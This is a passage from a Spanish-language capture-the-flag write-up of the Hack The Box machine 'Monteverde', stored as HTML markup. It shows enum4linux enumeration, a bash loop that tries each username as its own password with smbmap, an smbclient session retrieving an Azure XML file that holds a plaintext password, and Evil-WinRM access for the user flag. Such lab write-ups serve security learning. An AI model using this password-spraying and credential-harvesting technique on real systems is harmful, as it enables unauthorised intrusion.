Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oleary
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;morgan
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Group Policy Creator Owners&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 520&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator

 &lt;span class=&#34;o&#34;&gt;=======================================================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Users on 10.10.10.172 via RID cycling &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RIDS: 500-550,1000-1050&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;=======================================================================&lt;/span&gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;E&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Couldn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 &lt;span class=&#34;o&#34;&gt;=============================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Getting printer info &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;=============================================&lt;/span&gt; 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
enum4linux &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt; on Sat Jan &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 19:19:29 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos varios usuarios de los cuales no logramos obtener informacion que nos pudiesen ayudar a entrar en la maquina.&lt;/p&gt;
&lt;h2 id=&#34;smbmap&#34;&gt;SMBMAP&lt;/h2&gt;
&lt;p&gt;Utilizamos la lista de usuarios junto con smbmap para verificar que alguno de ellos tenga permisos en alguno de los SHARENAMEs de la maquina utilizando el nombre de usuario como contraseña.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;98
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/monteverde# &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; USER&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$USER&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; smbmap -H 10.10.10.172 -u &lt;span class=&#34;nv&#34;&gt;$USER&lt;/span&gt; -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$USER&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; &amp;lt; users.txt
roleary
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
dgalanos
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
smorgan
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
AAD_987d7f2f57d2
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
mhope
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
Guest
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
SABatchJobs
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User SMB session established on 10.10.10.172...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; IP: 10.10.10.172:445	Name: 10.10.10.172                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	.                                                  
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 06:43:36 2020	.
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 06:43:36 2020	..
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	.                                                  
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	InitShutdown
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	lsass
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	ntsvcs
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	scerpc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-3b4-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	epmapper
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-1ec-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	LSM_API_service
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	eventlog
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-488-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	atsvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-6a4-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	wkssvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-294-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-294-1
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	RpcProxy&lt;span class=&#34;se&#34;&gt;\4&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;9669&lt;/span&gt;
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	eddf3645116af5dd
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	RpcProxy&lt;span class=&#34;se&#34;&gt;\5&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;93&lt;/span&gt;
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	srvsvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	spoolss
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-b54-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	netdfs
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	vgauth-service
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-280-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	W32TIME_ALT
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	SQLLocal&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;SSQLSERVER
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	sql&lt;span class=&#34;se&#34;&gt;\q&lt;/span&gt;uery
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-ba0-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PIPE_EVENTROOT&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;IMV2SCM EVENT PROVIDER
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	CPFATP_6024_v4.0.30319
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132240333070920024.6024.DefaultAppDomain.miiserver
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	GoogleCrashServices&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;-1-5-18
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	GoogleCrashServices&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;-1-5-18-x64
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-bac-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132240367071490977.1628.DefaultAppDomain.wsmprovhost
	IPC$                                              	READ ONLY	Remote IPC
	.                                                  
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Thu Jan  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; 16:05:27 2020	.
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Thu Jan  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; 16:05:27 2020	..
	NETLOGON                                          	READ ONLY	Logon server share 
	.                                                  
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Thu Jan  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; 16:05:27 2020	.
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Thu Jan  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; 16:05:27 2020	..
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Thu Jan  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; 16:05:27 2020	MEGABANK.LOCAL
	SYSVOL                                            	READ ONLY	Logon server share 
	.                                                  
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:12:48 2020	.
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:12:48 2020	..
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:15:23 2020	dgalanos
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:41:18 2020	mhope
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:14:56 2020	roleary
	dr--r--r--                &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:14:28 2020	smorgan
	users$                                            	READ ONLY	
svc-ata
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
svc-bexec
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authentication error on 10.10.10.172
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que el usuario SABatchJobs tiene permisos de Lectura en &lt;strong&gt;azure_uploads&lt;/strong&gt; y &lt;strong&gt;users$&lt;/strong&gt;.&lt;/p&gt;
&lt;h2 id=&#34;user-mhope---azure-psadpasswordcredential&#34;&gt;USER mhope - Azure PSADPasswordCredential &lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales para enumerar &lt;code&gt;users$&lt;/code&gt; con smbclient, encontramos un archivo de azure que contiene la contraseña en texto plano en un archivo de XML.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@aoiri:~/htb/monteverde# smbclient \\\\10.10.10.172\\users$ -U SABatchJobs
Enter WORKGROUP\SABatchJobs&#39;s password: 
Try &amp;quot;help&amp;quot; to get a list of possible commands.
smb: \&amp;gt; dir
  .                                   D        0  Fri Jan  3 07:12:48 2020
  ..                                  D        0  Fri Jan  3 07:12:48 2020
  dgalanos                            D        0  Fri Jan  3 07:12:30 2020
  mhope                               D        0  Fri Jan  3 07:41:18 2020
  roleary                             D        0  Fri Jan  3 07:10:30 2020
  smorgan                             D        0  Fri Jan  3 07:10:24 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \&amp;gt; cd mhope
smb: \mhope\&amp;gt; dir
  .                                   D        0  Fri Jan  3 07:41:18 2020
  ..                                  D        0  Fri Jan  3 07:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 07:40:23 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \mhope\&amp;gt; get azure.xml 
getting file \mhope\azure.xml of size 1212 as azure.xml (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \mhope\&amp;gt; exit
root@aoiri:~/htb/monteverde# cat azure.xml 
��&amp;lt;Objs Version=&amp;quot;1.1.0.1&amp;quot; xmlns=&amp;quot;http://schemas.microsoft.com/powershell/2004/04&amp;quot;&amp;gt;
  &amp;lt;Obj RefId=&amp;quot;0&amp;quot;&amp;gt;
    &amp;lt;TN RefId=&amp;quot;0&amp;quot;&amp;gt;
      &amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt;
      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
    &amp;lt;/TN&amp;gt;
    &amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt;
    &amp;lt;Props&amp;gt;
      &amp;lt;DT N=&amp;quot;StartDate&amp;quot;&amp;gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
      &amp;lt;DT N=&amp;quot;EndDate&amp;quot;&amp;gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
      &amp;lt;G N=&amp;quot;KeyId&amp;quot;&amp;gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt;
      &amp;lt;S N=&amp;quot;Password&amp;quot;&amp;gt;4n0therD4y@n0th3r$&amp;lt;/S&amp;gt;
    &amp;lt;/Props&amp;gt;
  &amp;lt;/Obj&amp;gt;
&amp;lt;/Objs&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;Credenciales:
mhope:4n0therD4y@n0th3r$
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;evilwinrm&#34;&gt;EvilWinRm &lt;/h3&gt;
&lt;p&gt;Ya que el puerto de winrm esta abierto utilizamos las credenciales que tenemos junto con evilwinrm, obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
